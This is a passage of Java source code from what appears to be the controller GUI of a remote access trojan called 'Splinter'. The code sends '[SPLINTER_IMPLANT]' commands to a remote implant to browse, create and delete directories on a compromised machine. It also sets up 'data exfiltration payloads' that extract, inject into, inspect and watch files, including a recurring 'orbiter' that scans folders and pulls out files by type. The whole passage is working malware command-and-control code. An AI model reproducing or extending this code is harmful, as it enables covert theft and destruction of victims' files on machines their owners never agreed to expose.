          this.myThread.sendCommand_RAW("[SPLINTER_IMPLANT]%%%%%FILE_BROWSER_MAP_DIRECTORY%%%%%" + ((Object_FileBrowser)this.alCurrFileList.get(0)).myFile_UpDirectory);
        }

      }
      else if (ae.getSource() == this.jtblFileBrowser.jbtnNewDirectory)
      {
        String folderName = Drivers.jop_Query("New Folder Name:", "New Folder Creation");
        if ((folderName == null) || (folderName.trim().equals("")))
        {
          Drivers.jop_Error("No data entered for folder creation", "Unable to continue selected option");
        }
        else if (this.alCurrFileList.size() < 1)
        {
          this.myThread.sendCommand_RAW("[SPLINTER_IMPLANT]%%%%%FILE_BROWSER_CREATE_DIRECTORY%%%%%" + this.objFileBrowser_EmptyDirectory.myFile_fle + "%%%%%" + folderName);
        }
        else
        {
          this.myThread.sendCommand_RAW("[SPLINTER_IMPLANT]%%%%%FILE_BROWSER_CREATE_DIRECTORY%%%%%" + ((Object_FileBrowser)this.alCurrFileList.get(0)).myFile_parentDirectory + "%%%%%" + folderName);
        }

      }
      else if (ae.getSource() == this.jtblFileBrowser.jbtnDelete)
      {
        int selectedIndex = this.jtblFileBrowser.getSelectedRowIndex();

        if (selectedIndex < 0)
        {
          Drivers.jop_Error("You must first select a file in order to continue", "Unable to Complete Selected Action");
        }

        Object_FileBrowser fleToDelete = getSelectedFileObject_From_JTable();

        if (fleToDelete == null)
        {
          this.jtxtpne_ConsoleOut.appendString(true, "", "No Row selected!", Drivers.clrImplant, Drivers.clrBackground);
          Drivers.jop_Error("Invalid File Selected", "Unable to Complete Selected Action");
        }
        else if (fleToDelete.i_am_a_drive)
        {
          Drivers.jop("Can not delete a drive!!!!!!!!!!!!");
        }
        else
        {
          String deletionPrompt = "";

          if (fleToDelete.i_am_a_directory)
          {
            deletionPrompt = "Confirm Deletion of " + fleToDelete.myFile_fullPath + " and all files under this directory";
          }
          else
          {
            deletionPrompt = "Confirm Deletion of " + fleToDelete.myFile_fullPath;
          }

          if (Drivers.jop_Confirm(deletionPrompt, "Delete File") == 0)
          {
            this.myThread.sendCommand_RAW("[SPLINTER_IMPLANT]%%%%%FILE_BROWSER_DELETE_DIRECTORY%%%%%" + fleToDelete.myFile_fle);
          }
          else
          {
            this.jtxtpne_ConsoleOut.appendString(true, ""+this.myThread.getId(), "File deletion \"" + fleToDelete.myFile_fullPath + "\" cancelled for thread " + this.myThread.getId(), Drivers.clrImplant, Drivers.clrBackground);
          }

        }

      }
      else if (ae.getSource() == this.jtblFileBrowser.jbtnRefresh)
      {
        Drivers.jop("Feature not implemented yet...");
      }
      else if (ae.getSource() == this.jtblFileBrowser.jbtnSearch)
      {
        Drivers.jop("Feature not implemented yet...");
      }
      else if (ae.getSource() == this.jtblFileBrowser.jbtnShare)
      {
        Drivers.jop("Feature not implemented yet...");
      }
      else if (ae.getSource() == this.jtblFileBrowser.jtfCurrentPath)
      {
        this.myThread.sendCommand_RAW("[SPLINTER_IMPLANT]%%%%%FILE_BROWSER_MAP_DIRECTORY%%%%% " + this.jtblFileBrowser.jtfCurrentPath.getText().trim());
      }
      else if (ae.getSource() == this.jcbCurrentDirectoryFilter)
      {
        String selection = "";
        selection = (String)this.jcbCurrentDirectoryFilter.getSelectedItem();

        if (selection != null)
        {
          this.jtblFileBrowser.removeAllRows();

          for (int i = 0; i < this.alCurrFileList.size(); i++)
          {
            if (((Object_FileBrowser)this.alCurrFileList.get(i)).myFileExtension_withoutPeriod.equalsIgnoreCase(selection))
            {
              this.jtblFileBrowser.addRow(((Object_FileBrowser)this.alCurrFileList.get(i)).getJTableRowData());
            }
            else if (selection.trim().equals(""))
            {
              this.jtblFileBrowser.addRow(((Object_FileBrowser)this.alCurrFileList.get(i)).getJTableRowData());
            }
          }
          try
          {
            this.jtblFileBrowser.sortJTable();
          } catch (Exception localException1) {
          }
        }
      }
      else if (ae.getSource() == this.jrbPayload_Extractor)
      {
        this.payloadQuickReference = "Extract";

        this.DATA_EXFIL_PAYLOAD_SPECIFICATION = "EXTRACTOR_PAYLOAD";

        this.jtfDataExfiltrationContentType.setText("*.*");
        this.jtfDataExfiltrationContentType.setEditable(false);
        this.jtfDataExfiltrationContentType.setBackground(Color.gray.brighter());
      }
      else if (ae.getSource() == this.jrbPayload_Alerter)
      {
        this.payloadQuickReference = "Alert on File Creation";
        this.DATA_EXFIL_PAYLOAD_SPECIFICATION = "ALERTER_PAYLOAD";

        this.jtfDataExfiltrationContentType.setText("*.*");
        this.jtfDataExfiltrationContentType.setEditable(false);
        this.jtfDataExfiltrationContentType.setBackground(Color.gray.brighter());
      }
      else if (ae.getSource() == this.jrbPayload_Injector)
      {
        this.payloadQuickReference = "Inject Text";
        this.DATA_EXFIL_PAYLOAD_SPECIFICATION = "INJECTOR_PAYLOAD";
        this.jtfDataExfiltrationContentType.setEditable(true);
        this.jtfDataExfiltrationContentType.setBackground(Color.white);
      }
      else if (ae.getSource() == this.jrbPayload_Inspector)
      {
        this.payloadQuickReference = "Inspect for Character Sequence";
        this.DATA_EXFIL_PAYLOAD_SPECIFICATION = "INSPECTOR_PAYLOAD";
        this.jtfDataExfiltrationContentType.setEditable(true);
        this.jtfDataExfiltrationContentType.setBackground(Color.white);
      }
      else if (ae.getSource() == this.jrbPayload_Selector)
      {
        this.payloadQuickReference = "Extract";
        this.DATA_EXFIL_PAYLOAD_SPECIFICATION = "SELECTOR_PAYLOAD";
        this.jtfDataExfiltrationContentType.setEditable(true);
        this.jtfDataExfiltrationContentType.setBackground(Color.white);
      }
      else if (ae.getSource() == this.jrbOrbiter_Disabled)
      {
        this.orbiterEnabled = false;
      }
      else if (ae.getSource() == this.jrbOrbiter_Enabled)
      {
        this.orbiterEnabled = true;
      }
      else if (ae.getSource() == this.jbtnExecute_Exfiltration)
      {
        establishDataExfiltration();
      }
      else if (ae.getSource() == this.folderRecursion_Enabled)
      {
        this.folderRecursionEnabled = true;
      }
      else if (ae.getSource() == this.folderRecursion_Disabled)
      {
        this.folderRecursionEnabled = false;
      }
      else if (ae.getSource() == this.jtfDataExfiltrationFileType)
      {
        this.jtxtpne_ConsoleOut.appendString(true, "", "Please select the " + this.jbtnExecute_Exfiltration.getText() + " button to continue", Drivers.clrController, Drivers.clrBackground);
      }
      else if (ae.getSource() == this.jtfDataExfiltrationContentType)
      {
        this.jtxtpne_ConsoleOut.appendString(true, "", "Please select the " + this.jbtnExecute_Exfiltration.getText() + " button to continue", Drivers.clrController, Drivers.clrBackground);
      }

    }
    catch (Exception e)
    {
      Drivers.eop("actionPerformed", "Frame_FileBrowser", e, e.getLocalizedMessage(), false);
    }

    validate();
  }

  public boolean establishDataExfiltration()
  {
    try
    {
      String strExfiltrationPath = queryOrbitDirectoryPath(this.payloadQuickReference);
      String strExfiltrationFileType = this.jtfDataExfiltrationFileType.getText().trim();
      String strExfiltrationContentType = this.jtfDataExfiltrationContentType.getText().trim();

      this.jtxtpne_ConsoleOut.appendString(true, "", "Enabling Data Exfiltration Payload: " + this.DATA_EXFIL_PAYLOAD_SPECIFICATION + ", " + strExfiltrationPath + ", " + strExfiltrationFileType + ", " + strExfiltrationContentType + ", " + this.orbiterEnabled + ", " + "Quering user for Parameters...", Drivers.clrController, Drivers.clrBackground);

      this.myThread.sendCommand_RAW(this.DATA_EXFIL_PAYLOAD_SPECIFICATION + ", " + strExfiltrationPath + ", " + strExfiltrationFileType + ", " + strExfiltrationContentType + ", " + this.orbiterEnabled);

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("establishDataExfiltration", "Frame_FileBrowser", e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean setTitledBorderText(JPanel jpnlToChangeBorderTitle, String title)
  {
    try
    {
      ((TitledBorder)jpnlToChangeBorderTitle.getBorder()).setTitle(title);
      jpnlToChangeBorderTitle.repaint();
      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("setTitledBorderText", "Frame_FileBrowser", e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public int queryDelayInterval_Millis()
  {
    try
    {
      int selection = Drivers.jop_Confirm("Press YES if you want the directory scan interval to be measured in seconds... otherwise minutes will be the default wake interval", "Specify Seconds or Minutes for Exfiltration Timing Interval");

      int millisFactor = 60;

      String query = "Please enter your timing interval ";

      if (selection == 0)
      {
        millisFactor = 1;
        query = query + "in [seconds]";
      }
      else
      {
        query = query + "in [minutes]";
      }

      return millisFactor * Integer.parseInt(Drivers.jop_Query(query, "Enter Timing Interval"));
    }
    catch (Exception e)
    {
      Drivers.jop("Invalid input specified!!!");
    }

    return queryDelayInterval_Millis();
  }

  public String queryOrbitDirectoryPath(String extractionType)
  {
    try
    {
      String orbitDirectoryPath = this.strCurrentPath;

      if ((orbitDirectoryPath == null) || (this.alCurrFileList.size() > 0))
      {
        orbitDirectoryPath = ((Object_FileBrowser)this.alCurrFileList.get(0)).myFile_parentDirectory;
      }

      this.objOrbitFileDirectory = getSelectedFileObject_From_JTable();

      if (this.objOrbitFileDirectory != null)
      {
        if (this.objOrbitFileDirectory.i_am_a_file) {
          orbitDirectoryPath = this.objOrbitFileDirectory.myFile_parentDirectory;
        }
        else {
          orbitDirectoryPath = this.objOrbitFileDirectory.myFile_fullPath;
        }
      }

      if (Drivers.jop_Confirm(extractionType + " Directory Path is indicated as: \n" + "\"" + orbitDirectoryPath + "\"" + "\nIs this the correct directory you wish to " + extractionType + "?\n", "Confirm " + extractionType + " Directory") == 0)
      {
        return orbitDirectoryPath;
      }

      return null;
    }
    catch (Exception e)
    {
      Drivers.eop("queryOrbitDirectoryPath", "Frame_FileBrowser", e, e.getLocalizedMessage(), false);
    }

    return null;
  }

  public String queryOrbitDirectoryFileTyes()
  {
    try
    {
      String fileTypes = Drivers.jop_Query("Please enter Single File Type to exfiltrate \nExamples include:\n  *.*  \n  *.doc  \n  *.doc*  \n  *.*do  \n  *.*do*  \n  *word*.doc*  \n  etc...  \n ", "Specify File Type to Exfiltrate");

      if ((fileTypes == null) || (fileTypes.trim().equals(""))) {
        return queryOrbitDirectoryFileTyes();
      }
      if ((fileTypes.contains("/")) || (fileTypes.contains("\\")) || (fileTypes.contains(":")) || (fileTypes.contains("?")) || (fileTypes.contains("<")) || (fileTypes.contains(">")) || (fileTypes.contains("|")) || (fileTypes.contains("\"")))
      {
        Drivers.jop("Invalid Characters Entered for Orbiter Payload File Type Specification");
        return queryOrbitDirectoryFileTyes();
      }

      if (fileTypes.trim().length() > 100)
      {
        Drivers.jop("Invalid Characters Entered for Orbiter Payload File Type Specification\nMaximum length allowed at this time is 100 characters");
        return queryOrbitDirectoryFileTyes();
      }

      fileTypes = fileTypes.trim();

      if (fileTypes.equals("*"))
      {
        fileTypes = "*.*";
      }
      else if (fileTypes.contains("."));
      return "*." + fileTypes;
    }
    catch (Exception e)
    {
      Drivers.eop("queryOrbitDirectoryFileTyes", "Frame_FileBrowser", e, e.getLocalizedMessage(), false);
    }

    return "";
  }

  public int queryRecursiveOrbitDirectory(String path)
  {
    String query = "Do you wish to include all sub-directories under selected Folder?";

    if (path != null)
    {
      query = "Do you wish to include all sub-directories under \"" + path + "\"?";
    }

    int selection = Drivers.jop_Confirm_YES_NO_CANCEL(query, "Enable Recursive Exfiltration");

    this.enableRecursive = false;

    if (selection == 0)
    {
      this.enableRecursive = true;
    }
    else if (selection == 1)
    {
      this.enableRecursive = false;
    }
    else
    {
      selection = -1;
    }

    return selection;
  }

  public boolean updateFileList()
  {
    try
    {
      this.jtblFileBrowser.removeAllRows();

      if (this.alCurrFileList.size() < 1)
      {
        if (this.emptyDirectoryPath_only_used_if_alCurrFileList_is_empty == null)
        {
          this.emptyDirectoryPath_only_used_if_alCurrFileList_is_empty = "";
        }

        this.emptyDirectoryPath_only_used_if_alCurrFileList_is_empty = this.emptyDirectoryPath_only_used_if_alCurrFileList_is_empty.trim();

        this.strCurrentPath = this.emptyDirectoryPath_only_used_if_alCurrFileList_is_empty;
        this.jtblFileBrowser.jtfCurrentPath.setText(this.emptyDirectoryPath_only_used_if_alCurrFileList_is_empty);
        return true;
      }

      for (int i = 0; i < this.alCurrFileList.size(); i++)
      {
        this.jtblFileBrowser.addRow(((Object_FileBrowser)this.alCurrFileList.get(i)).getJTableRowData());
      }
      try
      {
        this.jtblFileBrowser.sortJTable();
      }
      catch (Exception localException1) {
      }
      try {
        this.strCurrentPath = ((Object_FileBrowser)this.alCurrFileList.get(0)).myFile_parentDirectory;
        this.jtblFileBrowser.jtfCurrentPath.setText(((Object_FileBrowser)this.alCurrFileList.get(0)).myFile_parentDirectory);
      } catch (Exception e) {
        this.jtblFileBrowser.jtfCurrentPath.setText("");
      }

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("updateFileList", "Frame_FileBrowser", e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public void itemStateChanged(ItemEvent ie)
  {
    try
    {
      if (ie.getSource() == this.jtblFileBrowser.jcbFileRoots)
      {
        Drivers.jop("Feature not implemented yet...");
      }

    }
    catch (Exception e)
    {
      Drivers.eop("ie", "Frame_FileBrowser", e, e.getLocalizedMessage(), false);
    }
  }

  public void keyTyped(KeyEvent ke)
  {
  }

  public void keyPressed(KeyEvent ke)
  {
    try
    {
      if (ke.getKeyCode() == 9)
      {
        if (ke.getSource() == this.jtblFileBrowser.jtfCurrentPath)
        {
          Drivers.jop("Got it! Ready to search through received directories");
        }
        try {
          this.jtblFileBrowser.jtfCurrentPath.grabFocus();
        }
        catch (Exception localException1)
        {
        }
      }
    }
    catch (Exception e)
    {
      Drivers.eop("keyPressed", "Frame_FileBrowser", e, e.getLocalizedMessage(), false);
    }
  }

  public void keyReleased(KeyEvent ke)
  {
  }

  public void closeFrame()
  {
    try
    {
      this.myThread.frameFileBrowserIsDisposed = true;
    }
    catch (Exception e)
    {
      Drivers.eop("closeFrame", "Frame_FileBrowser", e, e.getLocalizedMessage(), false);
      dispose();
    }
  }
}